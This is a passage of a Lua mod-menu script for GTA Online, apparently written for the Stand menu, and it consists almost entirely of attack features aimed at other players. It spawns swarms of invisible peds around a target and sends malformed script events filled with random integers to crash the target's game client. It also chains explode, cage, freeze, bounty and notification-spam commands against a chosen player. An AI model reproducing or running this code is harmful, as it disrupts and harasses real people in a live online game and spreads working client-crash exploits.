                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds16[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds16[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds16[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds16[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds16[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds16[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds16[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds16[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_milton")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds17 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds17[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds17[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds17[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds17[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds17[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds17[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds17[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds17[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_molly")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds18 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds18[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds18[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds18[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds18[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds18[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds18[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds18[i], 4, 1, 3, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds18[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_mrs_thornhill")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds19 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds19[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds19[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds19[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds19[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds19[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds19[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds19[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds19[i])
                    util.yield(5)
                end
                local pedhash = util.joaat("cs_nigel")
                while not STREAMING.HAS_MODEL_LOADED(pedhash) do
                    STREAMING.REQUEST_MODEL(pedhash)
                    util.yield(10)
                end
                local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                local FinalRenderedCamRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2).z
                SpawnedPeds20 = {}
                local ped_amount = math_random(7, 10)
                for i = 1, ped_amount do
                    local pedtype = 0
                    local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
                    local coords = PlayerPedCoords
                    local loc1, loc2, loc3, pedt = math_random(1,2), math_random(1,2), math_random(1,2), math_random(1,2)
                    coords.x = coords.x
                    coords.y = coords.y
                    coords.z = coords.z
                    if loc1 == 1 then
                        coords.x = coords.x - math_random(1, 5)
                    else
                        coords.x = coords.x + math_random(1, 5)
                    end
                    if loc2 == 1 then
                        coords.y = coords.y - math_random(1, 5)
                    else
                        coords.y = coords.y + math_random(1, 5)
                    end
                    if loc3 == 1 then
                        coords.z = coords.z - math_random(3, 5)
                    else
                        coords.z = coords.z + math_random(3, 5)
                    end
                    if pedt == 1 then
                        pedtype = 0
                    else
                        pedtype = 3
                    end
                    SpawnedPeds20[i] = entities.create_ped(pedtype, pedhash, coords, FinalRenderedCamRot)
                    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(SpawnedPeds20[i], true, true)
                    TASK.TASK_START_SCENARIO_IN_PLACE(SpawnedPeds20[i], "Walk_Facility", 0, false)
                    ENTITY.SET_ENTITY_INVINCIBLE(SpawnedPeds20[i], true)
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds20[i], false)
                    util.yield(5)
                end
                for i = 1, ped_amount do
                    ENTITY.SET_ENTITY_VISIBLE(SpawnedPeds20[i], true)
                    PED.SET_PED_COMPONENT_VARIATION(SpawnedPeds20[i], 3, 0, 1, 0)
                    util.yield()
                end
                util.yield(500)
                for i = 1, ped_amount do
                    entities.delete(SpawnedPeds20[i])
                    util.yield(5)					
                end
                util.yield(100)
                menu.trigger_commands("panic off")
                util.toast("Done")
            else
                util.toast("You can't use it on yourself")
            end
    end)


    local pedbangcrash = menu.list(crash, "Invalid explosion Crash", {}, "")

menu.action(pedbangcrash, "Invalid explosion", {"pedbang"}, "Ped bang", function()
local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local hash = util.joaat("cs_taostranslator2")
        while not STREAMING.HAS_MODEL_LOADED(hash) do
            STREAMING.REQUEST_MODEL(hash)
            util.yield(5)
        end
        --coord.z -= 1
        local ped = {}
        for i = 0, 10 do
            local coord = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(mvped, 0.0, 5.0, 0.0)
            ped[i] = entities.create_ped(0, hash, coord, 0)
            local pedcoord = ENTITY.GET_ENTITY_COORDS(ped[i], false)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(ped[i], 0xB1CA77B1, 0, true)
            WEAPON.SET_PED_GADGET(ped[i], 0xB1CA77B1, true)
            --FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pedcoord.x, pedcoord.y, pedcoord.z, 5, 10, false, false, 0)
            menu.trigger_commands("as ".. PLAYER.GET_PLAYER_NAME(pid) .. " explode " .. PLAYER.GET_PLAYER_NAME(pid) .. " ")
            ENTITY.SET_ENTITY_VISIBLE(ped[i], false)
        util.yield(25)
        end
        util.yield(2500)
        for i = 0, 10 do
            entities.delete_by_handle(ped[i])
            util.yield(10)
        end
end)

menu.toggle_loop(pedbangcrash, "Invalid explosion", {"togglepedbang"}, "Ped bang", function(on_toggle)
local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local hash = util.joaat("cs_taostranslator2")
        while not STREAMING.HAS_MODEL_LOADED(hash) do
            STREAMING.REQUEST_MODEL(hash)
            util.yield(5)
        end
        --coord.z -= 1
        local ped = {}
        for i = 0, 10 do
            local coord = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(mvped, 0.0, 5.0, 0.0)
            ped[i] = entities.create_ped(0, hash, coord, 0)
            local pedcoord = ENTITY.GET_ENTITY_COORDS(ped[i], false)
            WEAPON.GIVE_DELAYED_WEAPON_TO_PED(ped[i], 0xB1CA77B1, 0, true)
            WEAPON.SET_PED_GADGET(ped[i], 0xB1CA77B1, true)
            --FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pedcoord.x, pedcoord.y, pedcoord.z, 5, 10, false, false, 0)
            menu.trigger_commands("as ".. PLAYER.GET_PLAYER_NAME(pid) .. " explode " .. PLAYER.GET_PLAYER_NAME(pid) .. " ")
            ENTITY.SET_ENTITY_VISIBLE(ped[i], false)
        util.yield(5)
        end
        util.yield(2500)
        for i = 0, 10 do
            entities.delete_by_handle(ped[i])
            util.yield(10)
        end
end)


    local bozocrash = menu.list(crash, "Bozo Deleter Crash", {}, "")

menu.action(bozocrash, "Bozo Deleter Crash", {"bozocrash"}, "Sends a really strong crash coded by Mr.Pro.", function()
        notification("Testing Testing 1-2 sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
                local int_min = -2147483647
                local int_max = 2147483647
                    for i = 1, 15 do
                    util.trigger_script_event(1 << pid, {526822748, 11, -1647468200, -1340137264, -282486973, 1666586009, 461223445, -2029049682, 438233879, -901485438, -2064713778, math.random(int_min, int_max), math.random(int_min, int_max),
                        math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                        math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                    end
                    util.yield()
                    for i = 1, 15 do
                    util.trigger_script_event(1 << pid, {526822748, 11, -1647468200, -1340137264, -282486973, 1666586009, 461223445, -2029049682, 438233879, -901485438, -2064713778})
                    end
            menu.trigger_commands("givesh" .. players.get_name(pid))
                    util.trigger_script_event(1 << pid, {526822748, 11, -1647468200, -1340137264, -282486973, 1666586009, 461223445, -2029049682, 438233879, -901485438, -2064713778})
        notification("Bozo deleter sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
                end)

menu.toggle_loop(bozocrash, "Bozo Deleter Crash", {"togglebozocrash"}, "Sends a really strong crash coded by Mr.Pro.", function(on_toggle)
        notification("Testing Testing 1-2 sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
                local int_min = -2147483647
                local int_max = 2147483647
                    for i = 1, 15 do
                    util.trigger_script_event(1 << pid, {526822748, 11, -1647468200, -1340137264, -282486973, 1666586009, 461223445, -2029049682, 438233879, -901485438, -2064713778, math.random(int_min, int_max), math.random(int_min, int_max),
                        math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
                        math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
                    end
                    util.yield()
                    for i = 1, 15 do
                    util.trigger_script_event(1 << pid, {526822748, 11, -1647468200, -1340137264, -282486973, 1666586009, 461223445, -2029049682, 438233879, -901485438, -2064713778})
                    end
            menu.trigger_commands("givesh" .. players.get_name(pid))
                    util.trigger_script_event(1 << pid, {526822748, 11, -1647468200, -1340137264, -282486973, 1666586009, 461223445, -2029049682, 438233879, -901485438, -2064713778})
        notification("Bozo deleter sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
                end)


    local skidpowcrash = menu.list(crash, "Skid Crash", {}, "")

    	menu.action(skidpowcrash, "Skid Crash", {"skidpow"}, "Skidded from 2take1 code crashes modders woop woop.", function()
    	notification("Testing Testing 1-2 sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        		local int_min = -2147483647
        		local int_max = 2147483647
        			for i = 1, 15 do
        			util.trigger_script_event(1 << pid, {-555356783,1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, math.random(int_min, int_max), math.random(int_min, int_max),
            			math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
           	 		math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
        			end
        			util.yield()
        			for i = 1, 15 do
        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, -8734739, -1567138998, 1391800514, -635253496, 1657081814, -1735690996, -932389107, 1, -1861870899, 754494713, 957011786})
        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, 1183186299, 2022567013, 1324141071, -987311985, 124933669, -438970959, 379529199, 1, 760891200, -243349514, -876017787})
        			util.trigger_script_event(1 << pid, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			end
        	menu.trigger_commands("givesh" .. players.get_name(pid))
        			util.trigger_script_event(1 << pid, {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			util.trigger_script_event(1 << pid, {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			util.trigger_script_event(1 << pid, {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    	notification("Testing Testing 1-2 " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    			end)

    	menu.toggle_loop(skidpowcrash, "Skid Crash", {"toggleskidpow"}, "Skidded from 2take1 code crashes modders woop woop.", function(on_toggle)
    	notification("Testing Testing 1-2 sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        		local int_min = -2147483647
        		local int_max = 2147483647
        			for i = 1, 15 do
        			util.trigger_script_event(1 << pid, {-555356783,1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, math.random(int_min, int_max), math.random(int_min, int_max),
            			math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
           	 		math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
        			end
        			util.yield()
        			for i = 1, 15 do
        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, -8734739, -1567138998, 1391800514, -635253496, 1657081814, -1735690996, -932389107, 1, -1861870899, 754494713, 957011786})
        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, 1183186299, 2022567013, 1324141071, -987311985, 124933669, -438970959, 379529199, 1, 760891200, -243349514, -876017787})
        			util.trigger_script_event(1 << pid, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			end
        	menu.trigger_commands("givesh" .. players.get_name(pid))
        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, -8734739, -1567138998, 1391800514, -635253496, 1657081814, -1735690996, -932389107, 1, -1861870899, 754494713, 957011786})
        			util.trigger_script_event(1 << pid, {-1529596656, 1, -547323955, 1183186299, 2022567013, 1324141071, -987311985, 124933669, -438970959, 379529199, 1, 760891200, -243349514, -876017787})
        			util.trigger_script_event(1 << pid, {-555356783, 1, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    	notification("Testing Testing 1-2 " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    			end)



    local automobcrash = menu.list(crash, "Automobile Crash", {}, "")

    	menu.action(automobcrash, "Automobile Crash", {"automob"}, "Sends ped's and automobiles causing (S0) events. Blocked by most popular menus.", function()
    	notification("Automobile Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        		local int_min = -2147483647
        		local int_max = 2147483647
        			for i = 1, 15 do
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			end
        			util.yield()
        			for i = 1, 15 do
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			end
        	menu.trigger_commands("givesh" .. players.get_name(pid))
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    	notification("Automobile Crash Sent To " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    			end)

    	menu.toggle_loop(automobcrash, "Automobile Crash", {"toggleautomob"}, "Sends ped's and automobiles causing (S0) events. Blocked by most popular menus.", function(on_toggle)
    	notification("Automobile Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
        		local int_min = -2147483647
        		local int_max = 2147483647
        			for i = 1, 15 do
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			end
        			util.yield()
        			for i = 1, 15 do
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			end
        	menu.trigger_commands("givesh" .. players.get_name(pid))
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    	notification("Automobile Crash Sent To " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
    			end)

    local rahcrash = menu.list(crash, "Rahhh Crash", {}, "")

    	menu.action(rahcrash, "Rahhh Crash", {"rah"}, "Every stand crash and 10 explodes. Works like a yeet on yourself lol (Laggy).", function()
    	notification("Rahhh Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
	menu.trigger_commands("explode" .. players.get_name(pid))
	menu.trigger_commands("explode" .. players.get_name(pid))
	menu.trigger_commands("explode" .. players.get_name(pid))
	menu.trigger_commands("explode" .. players.get_name(pid))
	menu.trigger_commands("explode" .. players.get_name(pid))
	menu.trigger_commands("explode" .. players.get_name(pid))
	menu.trigger_commands("explode" .. players.get_name(pid))
	menu.trigger_commands("explode" .. players.get_name(pid))
	menu.trigger_commands("explode" .. players.get_name(pid))
	menu.trigger_commands("explode" .. players.get_name(pid))
	menu.trigger_commands("crash".. PLAYER.GET_PLAYER_NAME(pid))
		util.yield(1000)
	menu.trigger_commands("ngcrash".. PLAYER.GET_PLAYER_NAME(pid))
		util.yield(1000)
                  menu.trigger_commands("steamroll" .. players.get_name(pid))
		util.yield(1000)
	menu.trigger_commands("footlettuce".. PLAYER.GET_PLAYER_NAME(pid))
		util.yield(1000)
	notification("Bruh -_-", colors.red)
    			end)

    	menu.toggle_loop(rahcrash, "Rahhh Crash", {"togglerah"}, "Every stand crash and explode loops. Works like a yeet on yourself lol (Laggy).", function(on_toggle)
    	notification("Rahhh Crash sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
	menu.trigger_commands("explode" .. players.get_name(pid))
	menu.trigger_commands("crash".. PLAYER.GET_PLAYER_NAME(pid))
		util.yield(1000)
	menu.trigger_commands("ngcrash".. PLAYER.GET_PLAYER_NAME(pid))
		util.yield(1000)
                  menu.trigger_commands("steamroll" .. players.get_name(pid))
		util.yield(1000)
	menu.trigger_commands("footlettuce".. PLAYER.GET_PLAYER_NAME(pid))
		util.yield(1000)
	notification("Bruh -_-", colors.red)
    			end)

    local tehecrash = menu.list(crash, "Teheh Crash", {}, "")
 
    	menu.action(tehecrash, "Teheh Crash", {"tehe"}, "Stand crashes and trolls all in 1 (Laggy).", function()
    	notification("Teheheh sent to " .. PLAYER.GET_PLAYER_NAME(pids), colors.red)
	menu.trigger_commands("bounty".. players.get_name(pid) .. " 10000")
	menu.trigger_commands("ceokick" .. players.get_name(pid))
	menu.trigger_commands("mugloop" .. players.get_name(pid))
	menu.trigger_commands("ring" .. players.get_name(pid))
	menu.trigger_commands("freeze" .. players.get_name(pid))
	menu.trigger_commands("confuse" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("cage" .. players.get_name(pid))
	menu.trigger_commands("notifyspam"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("casinotp"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("mission"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("error"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("ring"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("cage"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("mugloop"..PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("explode" .. players.get_name(pid))
	menu.trigger_commands("crash".. PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("ngcrash".. PLAYER.GET_PLAYER_NAME(pid))
                  menu.trigger_commands("steamroll" .. players.get_name(pid))
	menu.trigger_commands("footlettuce".. PLAYER.GET_PLAYER_NAME(pid))
	menu.trigger_commands("notifyspam" .. players.get_name(pid))
        		local int_min = -2147483647
        		local int_max = 2147483647
        			for i = 1, 15 do
            			util.trigger_script_event(1 << pid, {2765370640, pid, 3747643341, math.random(int_min, int_max), math.random(int_min, int_max), 
            			math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max),
           	 		math.random(int_min, int_max), pid, math.random(int_min, int_max), math.random(int_min, int_max), math.random(int_min, int_max)})
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			end
        			util.yield()
        			for i = 1, 15 do
            			util.trigger_script_event(1 << pid, {1348481963, pid, math.random(int_min, int_max)})
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        			end
        	menu.trigger_commands("givesh" .. players.get_name(pid))
        		util.yield(100)
        			util.trigger_script_event(1 << pid, {495813132, pid, 0, 0, -12988, -99097, 0})
        			util.trigger_script_event(1 << pid, {495813132, pid, -4640169, 0, 0, 0, -36565476, -53105203})
        			util.trigger_script_event(1 << pid, {495813132, pid,  0, 1, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 17})
        			util.trigger_script_event(1 << pid, {-555356783, 3, 85952, 99999, 1142667203, 526822745, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
        	local mdl = util.joaat('a_c_poodle')
        		BlockSyncs(pid, function()
            	if request_model(mdl, 2) then
                	local pos = players.get_position(pid)
                	util.yield(1)
                	local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
                	ped1 = entities.create_ped(26, mdl, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 3, 0), 0)
                	local coords = ENTITY.GET_ENTITY_COORDS(ped1, true)
                	WEAPON.GIVE_WEAPON_TO_PED(ped1, util.joaat('WEAPON_HOMINGLAUNCHER'), 9999, true, true)
                	local obj
                	repeat
                    	obj = WEAPON.GET_CURRENT_PED_WEAPON_ENTITY_INDEX(ped1, 0)
                	until obj ~= 0 or util.yield()
                	ENTITY.DETACH_ENTITY(obj, true, true) 
                	util.yield(1)
                	FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 0, 1.0, false, true, 0.0, false)
                	entities.delete_by_handle(ped1)
                	util.yield(1)
            else
                	util.toast("Failed to load model. :/")
	notification("Worth it HAHA!!!", colors.red)
            end
        end)
    end)

